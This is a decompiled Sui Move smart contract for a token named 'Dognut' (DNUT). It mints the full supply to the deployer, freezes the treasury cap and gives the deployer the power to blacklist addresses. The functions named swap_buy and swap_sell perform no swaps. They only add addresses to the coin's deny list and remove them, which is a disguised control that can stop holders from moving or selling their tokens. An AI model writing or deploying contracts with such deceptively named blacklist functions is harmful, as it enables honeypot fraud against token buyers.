module 0x739d23074c56418a0d0c1cee3b1cd7c6c4ff5b52d285d7208f383d944ad2513::dnut {
    struct DNUT has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: DNUT, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<DNUT>(arg0, 9, b"DNUT", b"Dognut", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmPjYsVe86rNbooFeDr6kuYu8Wpp9cszR7t1igKGRqZ14E"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<DNUT>(&mut v3, 420000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<DNUT>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<DNUT>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<DNUT>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<DNUT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<DNUT>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<DNUT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<DNUT>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

